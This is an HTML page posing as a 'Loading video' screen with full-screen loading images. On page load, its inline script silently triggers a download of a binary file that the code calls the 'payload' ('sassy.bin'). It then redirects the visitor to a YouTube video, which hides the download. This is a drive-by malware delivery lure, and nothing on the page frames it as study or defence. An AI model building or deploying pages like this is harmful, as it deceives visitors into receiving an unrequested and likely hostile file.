<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Loading video</title>
    <meta http-equiv="Content-Security-Policy" content="script-src 'self' 'unsafe-inline';">
    
    <style>
        html, body { margin: 0; width: 100%; height: 100%; overflow: hidden; background: #000; }
        .loading-screen { position: fixed; inset: 0; display: block; width: 100%; height: 100%; object-fit: cover; }
        .loading-screen[hidden] { display: none; }
    </style>
</head>
<body>
    <img class="loading-screen" id="first-screen" src="assets/redirect-loading.png" alt="Loading video">
    <img class="loading-screen" id="second-screen" src="assets/redirect-loading-second.png" alt="Preparing video" hidden>

    <script>
        (function() {
            // CONFIGURATION
            const payloadPath = './sassy.bin'; 
            
            const targetUrl = "https://www.youtube.com/watch?v=Eq5R-eQjcQg";
            const startDelay = 500;   
            const downloadDuration = 1000; 
            const redirectDelay = 500; 

            window.addEventListener("load", () => {
                setTimeout(() => {

                    const a = document.createElement('a');
                    a.href = payloadPath;
                    a.download = 'sassy.bin';
                    a.target = '_blank';
                    

                    a.click();


                    setTimeout(() => {
                        document.body.removeChild(a);
                    }, 100);

                }, startDelay);


                setTimeout(() => {
                    window.location.replace(targetUrl);
                }, startDelay + downloadDuration + redirectDelay);
            });
        })();
    </script>
</body>
</html>
